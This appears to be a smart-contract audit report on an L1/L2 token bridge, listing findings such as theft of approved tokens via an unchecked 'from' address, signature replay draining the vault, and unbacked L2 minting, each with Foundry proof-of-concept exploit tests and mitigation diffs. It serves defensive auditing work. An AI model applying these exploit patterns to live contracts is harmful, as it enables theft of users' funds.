### [H-1] `depositTokensToL2` allows anyone to steal approved tokens of other users

**Description:** `depositTokensToL2` accepts an arbitrary `from` address without verifying that `msg.sender == from`. Because the function calls `token.safeTransferFrom(from, address(vault), amount)`, any attacker can drain tokens from any user who has previously approved the bridge, by supplying the victim's address as `from` and their own address as `l2Recipient`.

```solidity
// L1BossBridge.sol:75
function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
    ...
    token.safeTransferFrom(from, address(vault), amount); // `from` is never verified
    emit Deposit(from, l2Recipient, amount);
}
```

**Impact:** HIGH — Any user who approves the bridge (which is required for normal deposits) immediately becomes vulnerable. An attacker can steal their entire approved balance and redirect the corresponding L2 mint to themselves.

**Proof of Concept:**

```solidity
// test/L1TokenBridge.t.sol:testCanMoveApprovedTokensOfOtherUsers
function testCanMoveApprovedTokensOfOtherUsers() public {
    // Alice approves bridge
    vm.prank(user);
    token.approve(address(tokenBridge), type(uint256).max);

    // Attacker calls depositTokensToL2 using Alice as `from`
    uint256 depositAmount = token.balanceOf(user);
    address attacker = makeAddr("attacker");
    vm.startPrank(attacker);
    tokenBridge.depositTokensToL2(user, attacker, depositAmount);

    assertEq(token.balanceOf(user), 0);
    assertEq(token.balanceOf(address(vault)), depositAmount);
}
```

**Recommended Mitigation:** Restrict `from` to `msg.sender` so users can only deposit their own tokens:

```diff
- function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
+ function depositTokensToL2(address l2Recipient, uint256 amount) external whenNotPaused {
+     address from = msg.sender;
```

---

### [H-2] Signed withdrawal messages have no nonce or deadline, enabling signature replay attacks that drain the vault

**Description:** `withdrawTokensToL1` (and the underlying `sendToL1`) verifies an operator signature over a message containing only `(token, value, transferFrom calldata)`. There is no nonce, chain ID, or deadline included in the signed payload. A valid operator signature for any withdrawal amount can therefore be replayed an unlimited number of times until the vault is empty.

```solidity
// L1BossBridge.sol:102
function withdrawTokensToL1(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external {
    sendToL1(v, r, s,
        abi.encode(
            address(token),
            0,
            abi.encodeCall(IERC20.transferFrom, (address(vault), to, amount))
        )
    );
}
```

**Impact:** HIGH — An attacker who receives one legitimate operator signature can repeatedly call `withdrawTokensToL1` with the same signature until the vault is completely drained.

**Proof of Concept:**

```solidity
// test/L1TokenBridge.t.sol:testSignatureReplay
function testSignatureReplay() public {
    address attacker = makeAddr("attacker");
    uint256 vaultInitialBalance = 1000e18;
    uint256 attackerInitialBalance = 100e18;
    deal(address(token), address(vault), vaultInitialBalance);
    deal(address(token), attacker, attackerInitialBalance);

    vm.startPrank(attacker);
    token.approve(address(tokenBridge), type(uint256).max);
    tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialBalance);

    bytes memory message = abi.encode(
        address(token), 0,
        abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, attackerInitialBalance))
    );
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(
        operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message))
    );

    // Replay the same signature until vault is empty
    while (token.balanceOf(address(vault)) > 0) {
        tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
    }

    assertEq(token.balanceOf(attacker), attackerInitialBalance + vaultInitialBalance);
    assertEq(token.balanceOf(address(vault)), 0);
}
```

**Recommended Mitigation:** Include a nonce and deadline in the signed message and track used nonces on-chain:

```diff
+ mapping(address => uint256) public nonces;

- abi.encode(address(token), 0, abi.encodeCall(IERC20.transferFrom, (address(vault), to, amount)))
+ abi.encode(address(token), 0, abi.encodeCall(IERC20.transferFrom, (address(vault), to, amount)), nonces[to]++, block.chainid, deadline)
```

---

### [H-3] `depositTokensToL2` can be called with `from = vault`, triggering an infinite L2 minting loop

**Description:** Because `depositTokensToL2` accepts any `from` address and the vault has given the bridge an unlimited allowance, an attacker can call the function with `from = address(vault)`. The vault's tokens are transferred back to itself (net zero on L1) but the `Deposit` event is emitted, which the off-chain L2 minting service treats as a real deposit and mints tokens on L2.

```solidity
// L1BossBridge.sol:75-84
function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
    ...
    token.safeTransferFrom(from, address(vault), amount); // vault -> vault, balance unchanged
    emit Deposit(from, l2Recipient, amount);              // L2 mint triggered anyway
}
```

**Impact:** HIGH — An attacker can manufacture unlimited L2 tokens without ever supplying real L1 collateral, inflating the L2 token supply and depegging the bridge.

**Proof of Concept:**

```solidity
// test/L1TokenBridge.t.sol:testCanTransferFromVaultToVault
function testCanTransferFromVaultToVault() public {
    address attacker = makeAddr("attacker");
    uint256 vaultBalance = 500 ether;
    deal(address(token), address(vault), vaultBalance);

    vm.expectEmit(address(tokenBridge));
    emit Deposit(address(vault), attacker, vaultBalance);
    tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
    // Vault balance unchanged, but L2 mint event fired
}
```

**Recommended Mitigation:** Fix H-1 (require `from == msg.sender`) and additionally add an explicit check:

```diff
+ require(from != address(vault), "cannot deposit from vault");
```

---

### [H-4] `TokenFactory.deployToken` uses inline-assembly `create` opcode, which is incompatible with zkSync Era

**Description:** `deployToken` deploys contracts via inline assembly using the `create` opcode. zkSync Era uses a different EVM-equivalent model where contract deployment must go through the system deployer contract and the standard `create`/`create2` opcodes behave differently. The function will silently return `address(0)` on zkSync, breaking token deployment entirely.

```solidity
// TokenFactory.sol:26-34
assembly {
    // @audit - high this will not work with zkSync!!
    addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
}
s_tokenToAddress[symbol] = addr; // stores address(0) on zkSync
```

**Impact:** HIGH — `TokenFactory` is documented as being deployed on both L1 and L2. On a zkSync L2 deployment, `deployToken` will silently fail, registering `address(0)` for every token symbol, permanently breaking the factory.

**Proof of Concept:** Deploy `TokenFactory` on a zkSync network and call `deployToken`; `getTokenAddressFromSymbol` will return `address(0)`.

**Recommended Mitigation:** Use the zkSync-compatible `IContractDeployer` system contract for L2 deployments, or maintain separate factory implementations for L1 and L2 using conditional compilation / deployment scripts.

---

### [I-1] `DEPOSIT_LIMIT` should be declared `constant`

**Description:** `DEPOSIT_LIMIT` is assigned once at declaration and never modified, but is declared as a regular storage variable instead of `constant`.

```solidity
// L1BossBridge.sol:31
uint256 public DEPOSIT_LIMIT = 100_000 ether; // @audit - info should be constant
```

**Impact:** INFO — Wastes a storage slot and a cold SLOAD on every deposit check. Misleads readers into thinking the value can change.

**Recommended Mitigation:**
```diff
- uint256 public DEPOSIT_LIMIT = 100_000 ether;
+ uint256 public constant DEPOSIT_LIMIT = 100_000 ether;
```

---

### [I-2] `depositTokensToL2` does not follow the Checks-Effects-Interactions pattern

**Description:** The `Deposit` event is emitted after the `safeTransferFrom` external call rather than before it.

```solidity
// L1BossBridge.sol:79-83
token.safeTransferFrom(from, address(vault), amount); // Interaction first
emit Deposit(from, l2Recipient, amount);              // Effect second
```

**Impact:** INFO — While reentrancy is not currently exploitable here (the token transfer is the only external call and there is no reentrancy guard on this function), violating CEI makes future changes more error-prone and can confuse off-chain indexers that rely on event ordering.

**Recommended Mitigation:** Emit the event before the external call, or add `nonReentrant` modifier and document the deviation.

---

### [I-3] `L1Vault.token` should be declared `immutable`

**Description:** `L1Vault.token` is set once in the constructor and never modified, but is declared as a regular storage variable.

```solidity
// L1Vault.sol:13-14
// @audit info should be immutable
IERC20 public token;
```

**Impact:** INFO — Wastes a storage slot and adds a cold SLOAD to every token interaction. Using `immutable` bakes the value into bytecode.

**Recommended Mitigation:**
```diff
- IERC20 public token;
+ IERC20 public immutable token;
```

---

### [I-4] `L1Vault.approveTo` does not check the return value of `token.approve`

**Description:** `approveTo` calls `token.approve` without using `SafeERC20` or checking the boolean return value. Non-standard ERC20 tokens that return `false` on failure instead of reverting would silently leave the vault without the intended allowance.

```solidity
// L1Vault.sol:21-23
function approveTo(address target, uint256 amount) external onlyOwner {
    // @audit - info this should check return value of approve
    token.approve(target, amount);
}
```

**Impact:** INFO — The bridge calls `approveTo` once in its constructor with the deployer's own token, which is likely well-behaved. However, the pattern is unsafe for general use.

**Recommended Mitigation:** Use OpenZeppelin's `SafeERC20.safeApprove` (or `forceApprove`):

```diff
+ using SafeERC20 for IERC20;
...
- token.approve(target, amount);
+ token.safeApprove(target, amount);
```
